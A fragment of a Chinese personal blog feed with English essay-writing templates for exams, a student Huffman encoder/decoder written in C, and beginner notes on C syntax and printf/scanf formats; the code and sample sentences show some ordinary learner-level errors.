<h2 id="P3句型提取-2"><a href="#P3句型提取-2" class="headerlink" title="P3句型提取"></a>P3句型提取</h2><blockquote>
<p><strong>In conclusion, it is worth investing the effort to xx.</strong></p>
<p><strong>In my opinion, xx should be the first step.</strong></p>
</blockquote>
<h1 id="现象（影响、问题）框架1"><a href="#现象（影响、问题）框架1" class="headerlink" title="现象（影响、问题）框架1"></a>现象（影响、问题）框架1</h1><h2 id="真题-2"><a href="#真题-2" class="headerlink" title="真题"></a>真题</h2><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210610225440345.png" alt=""></p>
<h2 id="P1开头段-4"><a href="#P1开头段-4" class="headerlink" title="P1开头段"></a>P1开头段</h2><blockquote>
<p><strong>While the society is developing at a rapid rate, there has been an increase in the number of people/individuals who are more inclined to</strong> use translation applications. <strong>From my point of view</strong>, <strong>reasons behind this phenomenon are various and this trend might generate undesirable outcomes in the long run</strong>.</p>
</blockquote>
<h2 id="P1句型提取-2"><a href="#P1句型提取-2" class="headerlink" title="P1句型提取"></a>P1句型提取</h2><blockquote>
<p><strong>一、引出现象</strong></p>
<p><strong>While the society is developing at a rapid rate, there has been an increase in the number of people/individuals who are more inclined to</strong> do sth. </p>
<p><strong>二、表达不好的看法，自己的</strong></p>
<p><strong>From my point of view</strong>, <strong>reasons behind this phenomenon are various and this trend might generate undesirable outcomes in the long run</strong>.</p>
</blockquote>
<h2 id="P2主体段-4"><a href="#P2主体段-4" class="headerlink" title="P2主体段"></a>P2主体段</h2><blockquote>
<p><strong>版</strong>本一</p>
<p><strong>1.0 谈好处</strong></p>
<p><strong>On the one hand, the greatest advantage of</strong> using electronic translation applications <strong>is that it offers great convenience.</strong> <strong>More specifically,</strong> translation applications are usually user-friendly and can be easily downloaded in the applications store. <strong>For example</strong>, language learners can just type/input the sentence they don’t understand and check its meaning at any time.</p>
<p><strong>2.0 谈坏处</strong></p>
<p><strong>On the other hand, I am of the opinion that</strong> overusing electronic translation applications <strong>can cause more problems.</strong> <strong>For one thing</strong>, if language learners depend heavily on translation applications, they will gradually be detrimental to independent thinking ability. <strong>In addition</strong>, machine translations are inaccurate and grammatical when the text is long and complicated. <strong>this is because there is often a link between</strong> accurate meaning of language <strong>and</strong> the context.</p>
<p><strong>版本二</strong></p>
<p><strong>1.0 现象产生的原因（谈两个原因）</strong></p>
<p><strong>The main reason why translation applications have become immensely popular is that</strong> translation applications <strong>are more convenient than traditional dictionaries in this fast-paced era</strong>. <strong>Another equally important reason is that</strong> language learner are more user-friendly now <strong>because of</strong> technological advancements.</p>
<p><strong>1.1 第二个写法（谈一个现象，论述）</strong></p>
<p><strong>Multiple reason can account for the phenomenon mentioned above. the primary reason is that</strong> translation applications are <strong>too convenient</strong>. <strong>This is due to the fact that</strong> translation applications are user-friendly and can be easily downloaded in the applications store. <strong>For example</strong>, language learner can just type the sentence they don’t understand in the translation applications and check its meaning at any time when text is difficult to read.</p>
<p><strong>2.0 谈坏处</strong></p>
<p><strong>However, there are problems accompanying with the benefits mentioned in the last paragraph. For one thing, it would be universally acknowledged that</strong> if language learners depend heavily on translation applications, <strong>they will gradually be detrimental to independent thinking ability</strong>. <strong>For another one, no one can deny/doubt the fact that</strong> machine translation are ungrammatical and inaccurate when the text is long and complicated. This is because there is often a link between the accurate meaning of language and the context</p>
</blockquote>
<h2 id="P2句型提取-3"><a href="#P2句型提取-3" class="headerlink" title="P2句型提取"></a>P2句型提取</h2><blockquote>
<p><strong>版本一</strong></p>
<p><strong>1.0句型</strong></p>
<p><strong>On the one hand, the greatest advantage of xx is that it offers great convenience. More specifically, xx. For example xx.</strong></p>
<p><strong>2.0句型</strong></p>
<p><strong>On the other hand, I am of the opinion that xx can cause more problems. For one thing</strong>, <strong>if</strong> <strong>individuals</strong> xx. <strong>In addition xx.</strong></p>
<p><strong>this is because there is often a link between</strong> xx <strong>and</strong> the xx.</p>
<p><strong>版本二</strong></p>
<p><strong>1.0句型</strong></p>
<p><strong>The main reason why translation applications have become immensely popular is that xx are more convenient than traditional dictionaries in this fast-paced era. Another equally important reason is that xx because of technological advancements.</strong></p>
<p><strong>1.1句型</strong></p>
<p><strong>Multiple reason can account for the phenomenon mentioned above. the primary reason is that</strong> xx <strong>too convenient</strong>. <strong>This is due to the fact that</strong> xx <strong>For example</strong>, xx.</p>
<p><strong>2.0句型</strong></p>
<p><strong>However, there are problems accompanying with the benefits mentioned in the last paragraph. For one thing, it would be universally acknowledged that</strong> <strong>if</strong> xx, <strong>they will gradually be detrimental to independent thinking ability</strong>. <strong>For another one, no one can deny/doubt the fact that</strong> xx. <strong>This is because there is often a link between</strong> xx the xx.</p>
</blockquote>
<h2 id="P3结尾段-4"><a href="#P3结尾段-4" class="headerlink" title="P3结尾段"></a>P3结尾段</h2><blockquote>
<p><strong>In conclusion, using translation applications are more drawbacks than benefits and I highly suggest that language learner should use translation applications reasonably.</strong></p>
</blockquote>
<h2 id="P3句型提取-3"><a href="#P3句型提取-3" class="headerlink" title="P3句型提取"></a>P3句型提取</h2><blockquote>
<p><strong>In conclusion,  xx are more drawbacks than benefits and I highly suggest that xx reasonably.</strong></p>
</blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>学习记录</tag>
        <tag>议论文万能模板</tag>
      </tags>
  </entry>
  <entry>
    <title>[C]哈夫曼编码器和译码器（C语言）</title>
    <url>/posts/84.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="哈夫曼编码器和译码器-完整代码"><a href="#哈夫曼编码器和译码器-完整代码" class="headerlink" title="哈夫曼编码器和译码器(完整代码)"></a>哈夫曼编码器和译码器(完整代码)</h1><p><img src="https://i.loli.net/2021/05/25/8qyZe3hKCnFUT7H.png" alt="image-20210525192524119"></p>
<p><img src="https://i.loli.net/2021/05/25/VZ3UzDhgic2XEvL.png" alt="image-20210525204021071"></p>
<h1 id="执行结果和代码奉上"><a href="#执行结果和代码奉上" class="headerlink" title="执行结果和代码奉上"></a>执行结果和代码奉上</h1><p><img src="https://i.loli.net/2021/05/25/ZjsMtCQTE79iHcX.png" alt="image-20210525204133220"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 30 <span class="comment">//叶子节点最大值</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 2*N-1 <span class="comment">//所有结点最大值</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="keyword">char</span> data;</span><br><span class="line">	<span class="keyword">int</span> weight;</span><br><span class="line">	<span class="keyword">int</span> parent;</span><br><span class="line">	<span class="keyword">int</span> Lchild;</span><br><span class="line">	<span class="keyword">int</span> Rchild;</span><br><span class="line">	<span class="keyword">int</span> flag;</span><br><span class="line">&#125;HTNode,HuffmanTree[M+<span class="number">1</span>]; <span class="comment">//0号单元不用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化哈夫曼树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitHuffmanTree</span><span class="params">(HuffmanTree ht,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"#提示——（输入示例a b c d e）请输入对应叶子节点的字符：\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="comment">//初始化叶子节点</span></span><br><span class="line">	&#123;</span><br><span class="line">		ht[i].data=<span class="string">'\0'</span>;</span><br><span class="line">		ht[i].Lchild=<span class="number">0</span>;</span><br><span class="line">		ht[i].Rchild=<span class="number">0</span>;</span><br><span class="line">		ht[i].weight=<span class="number">0</span>;</span><br><span class="line">		ht[i].parent=<span class="number">0</span>;</span><br><span class="line">		ht[i].flag=<span class="number">0</span>;</span><br><span class="line">		getchar(); <span class="comment">//消除空格 读取下一次输入的空格并且消除</span></span><br><span class="line">		ht[i].data=getchar();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"#提示——（输入示例12 40 15 8 25）请输入对应叶子节点的权重：\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++) <span class="comment">//初始化叶子节点</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;ht[i].weight);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> m=<span class="number">2</span>*n<span class="number">-1</span>;<span class="comment">//结点总数</span></span><br><span class="line">	<span class="keyword">for</span>(i=n+<span class="number">1</span>;i&lt;=m;i++)<span class="comment">//初始化非叶子节点</span></span><br><span class="line">	&#123;</span><br><span class="line">		ht[i].Lchild=<span class="number">0</span>;</span><br><span class="line">		ht[i].Rchild=<span class="number">0</span>;</span><br><span class="line">		ht[i].weight=<span class="number">0</span>;</span><br><span class="line">		ht[i].parent=<span class="number">0</span>;</span><br><span class="line">		ht[i].flag=<span class="number">0</span>; <span class="comment">//判断是否被删除</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//选择最小权值节点下标</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(HuffmanTree ht,<span class="keyword">int</span> n)</span><span class="comment">//选择最小权值的结点下标</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,temp,<span class="built_in">min</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)<span class="comment">//设置初始下标和权值</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(ht[i].flag==<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			temp=ht[i].weight;<span class="comment">//初始权值</span></span><br><span class="line">			<span class="built_in">min</span>=i;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(ht[i].flag==<span class="number">0</span>&amp;&amp;temp&gt;ht[i].weight)</span><br><span class="line">		&#123;</span><br><span class="line">			temp=ht[i].weight;</span><br><span class="line">			<span class="built_in">min</span>=i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ht[<span class="built_in">min</span>].flag=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">min</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构建哈夫曼树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createHuffmanTree</span><span class="params">(HuffmanTree ht,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=n+<span class="number">1</span>;i&lt;=(<span class="number">2</span>*n<span class="number">-1</span>);i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> s1=select(ht,i<span class="number">-1</span>);<span class="comment">//这里i-1</span></span><br><span class="line">		<span class="keyword">int</span> s2=select(ht,i<span class="number">-1</span>);</span><br><span class="line">		ht[i].weight = ht[s1].weight+ht[s2].weight;</span><br><span class="line">		ht[s1].parent=i;</span><br><span class="line">		ht[s2].parent=i;</span><br><span class="line">		ht[i].Lchild=s1;</span><br><span class="line">		ht[i].Rchild=s2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得编码（从下往上反向）</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetCode</span><span class="params">(<span class="keyword">int</span> A[],HuffmanTree ht, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> length=<span class="number">0</span>,i,j,<span class="built_in">get</span>;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">100</span>]; <span class="comment">//定义要输入字符的空间</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"（#提示——输入示例bbbaddeccbbb）输入要编码的字符：\n"</span>);</span><br><span class="line">	getchar();<span class="comment">//清除换行符</span></span><br><span class="line">	gets(s);</span><br><span class="line">	<span class="keyword">int</span> m=<span class="built_in">strlen</span>(s);</span><br><span class="line">	<span class="keyword">for</span>(i=m<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)<span class="comment">//从后往前处理字符</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(s[i]==ht[j].data)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">get</span> = j;  <span class="comment">//获取最后一个字符的flag也就是位置</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span>(ht[<span class="built_in">get</span>].parent) </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(ht[ht[<span class="built_in">get</span>].parent].Lchild==<span class="built_in">get</span>) <span class="comment">//判断父节点的左孩子是否等于我们找的get那个位置</span></span><br><span class="line">			&#123;</span><br><span class="line">				A[length]=<span class="number">0</span>; <span class="comment">//左孩子是0</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				A[length]=<span class="number">1</span>; <span class="comment">//右孩子是1</span></span><br><span class="line">			&#125;</span><br><span class="line">			length++;</span><br><span class="line">			<span class="built_in">get</span>=ht[<span class="built_in">get</span>].parent;<span class="comment">//再把父节点给get 直到父节点为0 就编码成功</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> length<span class="number">-1</span>;  <span class="comment">//最后会多+1，所以减去一个1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印编码</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printCode</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=length; i&gt;=<span class="number">0</span>; i--)<span class="comment">//从后向前输出即为编码结果</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d"</span>,A[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetreCode</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">char</span> B[], HuffmanTree ht, <span class="keyword">int</span> length1, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,length2=<span class="number">0</span>,cur=<span class="number">2</span>*n<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=length1;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(A[i])<span class="comment">//A[i]只可能为1或者0，提示：0是左孩子，1是右孩子</span></span><br><span class="line">		&#123;</span><br><span class="line">			cur=ht[cur].Rchild;<span class="comment">//根结点的右孩子赋值给cur</span></span><br><span class="line">			<span class="keyword">if</span>(ht[cur].Rchild==<span class="number">0</span>)<span class="comment">//该结点的右孩子如果是0就说明是叶子节点，提示：二叉树只有0和2</span></span><br><span class="line">			&#123;</span><br><span class="line">				B[length2]=ht[cur].data;</span><br><span class="line">				length2++;</span><br><span class="line">				cur=<span class="number">2</span>*n<span class="number">-1</span>;<span class="comment">//回到根节点</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			cur=ht[cur].Lchild;<span class="comment">//和上面一样就不说了</span></span><br><span class="line">			<span class="keyword">if</span>(ht[cur].Lchild==<span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				B[length2]=ht[cur].data;</span><br><span class="line">				length2++;</span><br><span class="line">				cur=<span class="number">2</span>*n<span class="number">-1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> length2<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解码打印</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printreCode</span><span class="params">(<span class="keyword">char</span> B[],<span class="keyword">int</span> length2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=length2;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%c"</span>,B[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印哈夫曼树</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printHuffmanTree</span><span class="params">(HuffmanTree ht, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"结点\tweigt\tdata\tLchild\tRchild\tparent\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\t%d\t%c\t%d\t%d\t%d\n"</span>,i,ht[i].weight,ht[i].data,ht[i].Lchild,ht[i].Rchild,ht[i].parent);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HuffmanTree ht; </span><br><span class="line">	<span class="keyword">int</span> n; <span class="comment">//n为所需的结点数</span></span><br><span class="line">	<span class="keyword">int</span> A[<span class="number">100</span>];<span class="comment">//存储编码</span></span><br><span class="line">	<span class="keyword">char</span> B[<span class="number">100</span>];<span class="comment">//存储输出的字符串</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"#提示——（输入示例 5）请输入叶子节点个数:\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">	InitHuffmanTree(ht,n); <span class="comment">//初始化</span></span><br><span class="line">	createHuffmanTree(ht,n); <span class="comment">//构建哈弗曼树</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> length = GetCode(A,ht,n);</span><br><span class="line">	printCode(A,length);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> length2 = GetreCode(A,B,ht,length,n);</span><br><span class="line">	printreCode(B,length2);</span><br><span class="line"></span><br><span class="line">	printHuffmanTree(ht,n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>C语言</tag>
        <tag>成长之路</tag>
      </tags>
  </entry>
  <entry>
    <title>[C语言]学习之路</title>
    <url>/posts/83.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="实例：C语言编程题"><a href="#实例：C语言编程题" class="headerlink" title="实例：C语言编程题"></a>实例：C语言编程题</h1><blockquote>
<p>求100到300之间所有素数</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">100</span>;i &lt;= <span class="number">300</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j = <span class="number">2</span>; j &lt;= i; j++)</span><br><span class="line">			<span class="keyword">if</span>(i%j == <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">if</span>(j == i)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"%-4d"</span>,i);  <span class="comment">//-4d是左对齐</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="预备计算机知识"><a href="#预备计算机知识" class="headerlink" title="预备计算机知识"></a>预备计算机知识</h1><blockquote>
<p>汇编语言是最低级的语言，它可以直接与硬件打交道。高级语言有Pascal、Basic、Fortran等等。高级语言的一条语句对应低级语言的很多条语句，任何高级语言编写的程序都要经过编译程序的编译、连接才能成为可以运行的程序。<br>　　编译连接的过程也就是把高级语言翻译成机器语言(二进制机器码)的过程，而汇编语言是基本上与机器语言一 　　一对应的一种语言。这个翻译过程是由编译程序自动完成的。把C语言定为中级语言是有它的道理的，因为C语言既有汇编语言的存取底层硬件的能力，又具有高级语言的许多特点。熟练掌握了C语言，学习其它的各种编程语言应该是很轻松的了。<br>　　<br>　　C语言的书写格式：<br>　　1) 一个C语言编写的源程序，必定有一个主程序(称为main()函数，在C语言中子程序称为“函数”(当然，不要理解成为数学里面的“函数”)。但是决不能有一个以上的main函数(即只能有一个)。<br>　　2) 函数语句块用‘{’括号开始， 以‘}’反括号结束。这样的花括号必须成对出现。<br>　　3) 表达式写在小括号里面，以‘(’括号开始，以‘)’反括号结束。<br>　　4) 函数不能嵌套，即函数里面不能再套函数。(每一个函数是完成一个特定功能的函数模块)<br>　　<br>　　C语言的组成：<br>　　 C语言是由许多函数组成的。其中只有一个主函数(main()函数)。C程序执行时总是从main函数的‘{’处开始，至main函数的反大括号’}’处结束。当然还有其它一些规则，这将在以后的学习中去熟悉它。<br>　　<br>　　C语言的书写规则：<br>　　 C语言在书写时有它自身的特点：书写格式比较自由，在一行里可以写多条语句，一个语句也可以分写在多行上。虽然如此，在书写源程序时还是要注意哪些可以自由书写，而哪些必须要按照书写规则来书写。<br>　　几条规则写在下面：<br>　　1) 一行内可以写几个语句，建议一行不超过两条语句；<br>　　2) 一条语句可以写在多行上；<br>　　3) C语句不需要写行标号；<br>　　4) 每条语句及数据定义的后面要写上分号以表示该语句结束；<br>　　5) C语言中注释用 //来表示；<br>　　6) 建议书写时采用缩进格式；<br>　　7) 花括号、小括号都是成对出现的。<br>　　<br>　　一个最简单的C程序的编写：<br>　 　/程序代码/ /注释部分/<br>　　 main() /main是主函数名。紧跟在main后面的括号是放参数的。<br>　　 括号里面为空说明main函数不需要参数/<br>　　{ /正写的大花括号表示main函数从这里开始/<br>　　<br>　　} /反写的大花括号表示main函数到这里结束/<br>　　<br>　　说明：由于是一个演示程序，在函数体内并没有任何可以执行的语句，也就是这个程序什么事也不做。<br>　　这个程序就是这么简单： 写在一行上就是 main() { }<br>　　你在TC的编辑环境下把这段代码输入进去，按F9键编译连接，按CTRL_F5运行，一定很正常。但是什么结果也不会有，因为在main函数里面什么代码也没有。<br>　　<br>　　下面再举一个可以向屏幕上输出一条信息的例子：<br>　　main()<br>　　{<br>　　 printf(“这就是C语言编写的程序!”); /这一条语句的作用是向屏幕输出一条信息<br>　　 ”这就是C语言编写的程序!”/<br>　　}<br>　　在这个程序中，main函数只有一条语句：printf(“这就是C语言编写的程序!”);这个语句的作用是向屏幕输出一个字符串。有关这个语句的知识以后再讲。现在要注意的是一个C语言程序的框架是怎样组成的。<br>　　<br>　　C语言程序的几种文件格式：<br>　　 1、 源程序—在TC集成环境中输入的程序文本称为源程序。源程序是一种文本文件。它是我们看得见并认识的一种文件。其扩展名为.C。例如你把文件保存为TEST，那么在磁盘上应看得到TEST.C这个文件。这样的文件可以用记事本打开。<br>　　 2、二进制文件—写完了源程序后接着要做的是编译这个文件。在TC集成环境里是按ALT_F9键，编译后生成了一个二进制文件，这个二进制文件名为TEST.OBJ，也就是扩展名为OBJ的目标文件。<br>　　 3、运行文件—最后一步是make(或Link)，在TC集成环境里是按F9键Make之后生成了一个可以在DOS下运行的文件，其扩展名为EXE。如TEST.EXE。这个EXE文件是由第2步中的OBJ文件生成的。<br>　　OBJ文件虽然是二进制文件，而电脑又是可以运行二进制文件的，为什么还要把OBJ文件Link为EXE文件才能运行？这里的知识就比较多了，这里不能多讲。<br>　　但是要明白一点，在DOS下仅仅有了一个二进制文件还不能运行，因为操作系统要把这些二进制文件加以规划，把相应的数据、程序代码放到应该放的内存位置，这样的经过严密规划和组织好了的二进制文件才能运行。而这些只有在生成的EXE文件里面才做完了这些工作。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">015</span>; <span class="comment">//0开头的是八进制</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>输出结果13</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">47</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>,x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%X\n"</span>,x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%#X\n"</span>,x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%#x\n"</span>,x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>输出结果</p>
<p>2f<br>2F<br>0X2F<br>0x2f</p>
</blockquote>
<blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">%a,%A 读入一个浮点值(仅C99有效)  </span><br><span class="line">　　%c 读入一个字符  </span><br><span class="line">　　%d 读入十进制整数  </span><br><span class="line">　　%i 读入十进制，八进制，十六进制整数  </span><br><span class="line">　　%o 读入八进制整数  </span><br><span class="line">　　%x,%X 读入十六进制整数  </span><br><span class="line">　　%s 读入一个字符串，遇空格、制表符或换行符结束。  </span><br><span class="line">　　%f,%F,%e,%E,%g,%G 用来输入实数，可以用小数形式或指数形式输入。  </span><br><span class="line">　　%p 读入一个指针  </span><br><span class="line">　　%u 读入一个无符号十进制整数  </span><br><span class="line">　　%n 至此已读入值的等价字符数  </span><br><span class="line">　　%[] 扫描字符集合  </span><br><span class="line">　　%% 读%符号  </span><br><span class="line">　　x是1~f，X是1~F</span><br><span class="line">　　#是带格式输出 例如0x代表十六进制</span><br></pre></td></tr></table></figure></div>
</blockquote>
<h1 id="C语言常见误区"><a href="#C语言常见误区" class="headerlink" title="C语言常见误区"></a>C语言常见误区</h1><blockquote>
<p>　1.书写标识符时，忽略了大小写字母的区别。</p>
